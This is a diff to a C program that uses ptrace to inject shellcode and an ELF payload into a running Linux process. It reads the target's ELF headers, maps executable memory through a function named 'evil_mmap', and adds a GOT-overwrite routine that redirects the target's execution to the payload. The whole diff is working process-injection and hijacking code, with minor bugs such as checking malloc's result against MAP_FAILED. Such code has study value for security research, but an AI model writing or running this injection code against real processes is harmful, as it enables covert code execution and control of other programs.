@@ -22,6 +22,10 @@ typedef struct handle
 {
     pid_t pid;                      // PID of target process
 
+    uint64_t base_addr;             // base address of target process
+    Elf64_Ehdr *ehdr;               // ELF header of target process
+    Elf64_Phdr *phdr;               // program header of target process
+
     char *executable;               // payload
 
     struct user_regs_struct pt_reg; // Register of target process
@@ -29,6 +33,7 @@ typedef struct handle
     uint8_t *shellcode;             // Address of shellcode
 
     uint64_t inject_addr;           // Address where we inject the shellcode
+    uint64_t payload_entry;         // entry of payload
 }handle_t;
 
 static inline volatile long
@@ -39,7 +44,7 @@ uint64_t injected_code() __attribute__((aligned(8)));
 int pid_read(pid_t, const void *, const void *, size_t);
 int pid_write(pid_t, const void *, const void *, size_t);
 uint8_t *create_shellcode(void (*fn)(), size_t len);
-uint64_t get_inject_addr(pid_t);
+uint64_t get_inject_addr(handle_t *);
 
 uint64_t f1 = (uint64_t)injected_code;
 uint64_t f2 = (uint64_t)pid_read;
@@ -84,18 +89,17 @@ evil_mmap(void *addr, size_t length, int prot, int flags, int64_t fd, uint64_t o
 
 uint64_t injected_code()
 {
-    /*
-    evil_mmap((void *)BASE_ADDRESS, 0x4000, 
+    evil_mmap(NULL, 0x4000, 
     PROT_READ|PROT_WRITE|PROT_EXEC, 
     MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, 
     -1, 0);
     __asm__ volatile("int3");
-    */
     
+    /*
     char str[] = {'[', 'I', '\'', 'm', ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
     print_string(1, str, 14);
     __asm__ volatile("int3");
-    
+    */
 }
 
 // Duplicate the function (shellcode) to a heap address space
@@ -154,12 +158,12 @@ int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
 
 /* Obtain the inject address by referring program header, 
 *  hence the host program should be compiled with -no-pie. */ 
-uint64_t get_inject_addr(pid_t pid)
+uint64_t get_inject_addr(handle_t *h)
 {
     uint64_t inject_addr = 0;
     char maps[512], buffer[64];
     FILE *fd;
-    snprintf(maps, 512, "/proc/%d/maps", pid);
+    snprintf(maps, 512, "/proc/%d/maps", h->pid);
     if((fd = fopen(maps, "r"))  == NULL)
     {
         perror("fopen");
@@ -172,15 +176,15 @@ uint64_t get_inject_addr(pid_t pid)
     }
     fclose(fd);
     char* base_str = strtok(buffer, "-");
-    uint64_t base_addr = strtoul(base_str, NULL, 16);
+    h->base_addr = strtoul(base_str, NULL, 16);
     
     uint8_t *mem = malloc(sizeof(Elf64_Ehdr));
-    if(mem == NULL)
+    if(mem == MAP_FAILED)
     {
         perror("mmap");
         exit(-1);
     }
-    if(pid_read(pid, mem, (void *)base_addr, sizeof(Elf64_Ehdr)) < 0)
+    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr)) < 0)
     {
         perror("ptrace");
         exit(-1);
@@ -190,30 +194,67 @@ uint64_t get_inject_addr(pid_t pid)
     free(mem);
     
     mem = malloc(sizeof(Elf64_Ehdr) + phdr_size);
-    if(mem == NULL)
+    if(mem == MAP_FAILED)
     {
         perror("mmap");
         exit(-1);
     }
-    if(pid_read(pid, mem, (void *)base_addr, sizeof(Elf64_Ehdr) + phdr_size) < 0)
+    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr) + phdr_size) < 0)
     {
         perror("ptrace");
         exit(-1);
     }
-    ehdr = (Elf64_Ehdr *)mem;
-    Elf64_Phdr *phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
+    h->ehdr = (Elf64_Ehdr *)mem;
+    h->phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
     int i;
     for(i = 0; i < ehdr->e_phnum; i++)
     {
-        if((phdr[i].p_type == PT_LOAD)&&(phdr[i].p_flags == PF_R + PF_X))
+        if((h->phdr[i].p_type == PT_LOAD)&&(h->phdr[i].p_flags == PF_R + PF_X))
         {
-            inject_addr = phdr[i].p_vaddr + phdr[i].p_memsz;
+            inject_addr = h->phdr[i].p_vaddr + h->phdr[i].p_memsz;
             break;
         }
     }
-    free(mem);
     return inject_addr;
 }
+
+void got_redirection(handle_t h)
+{
+    int i;
+    uint64_t dynamic_addr;
+    size_t dynamic_size;
+    uint64_t got_addr;
+    for(i = 0; i < h.ehdr->e_phnum; i++)
+    {
+        if(h.phdr[i].p_type == PT_DYNAMIC)
+        {
+            dynamic_addr = h.phdr[i].p_vaddr;
+            dynamic_size = h.phdr[i].p_memsz;
+            break;
+        }
+    }
+    Elf64_Dyn *dyn = malloc(dynamic_size);
+    if(pid_read(h.pid, dyn, (void *)dynamic_addr, dynamic_size) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+    for(i = 0; dyn[i].d_tag != DT_NULL; i++)
+    {
+        if(dyn[i].d_tag == DT_PLTGOT)
+        {
+            got_addr = dyn[i].d_un.d_ptr + 4 * sizeof(uint64_t);
+            break;
+        }
+    }
+    printf("GOT redirection address: %lx\n", got_addr);
+    if(pid_write(h.pid, (void *)got_addr, &h.base_addr, sizeof(uint64_t)) < 0)
+    {
+        perror("ptrace");
+        exit(-1);
+    }
+}
+
 
 int main(int argc, char *argv[])
 {
@@ -236,7 +277,7 @@ int main(int argc, char *argv[])
     }
     wait(&status);
     printf("Attached to the target process.\n");
-    if((h.inject_addr = get_inject_addr(h.pid)) == 0)
+    if((h.inject_addr = get_inject_addr(&h)) == 0)
     {
         printf("Failed to get the injection address.\n");
         exit(EXIT_FAILURE);
@@ -309,14 +350,16 @@ int main(int argc, char *argv[])
     }
     uint8_t *mem = mmap(NULL, WORD_ALIGN(st.st_size), PROT_READ, MAP_PRIVATE, fd, 0);
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
-    
+    h.payload_entry = h.pt_reg.rax + ehdr->e_entry;
+
     if(pid_write(h.pid, (void *)BASE_ADDRESS, mem, WORD_ALIGN(st.st_size)) < 0)
     {
         printf("Failed to load the payload.\n");
         exit(-1);
     }
     
-    
+    got_redirection(h);
+
     // Set the PC of host to the payload
     h.pt_reg.rip = old_rip;
     h.pt_reg.rbp = old_rbp;
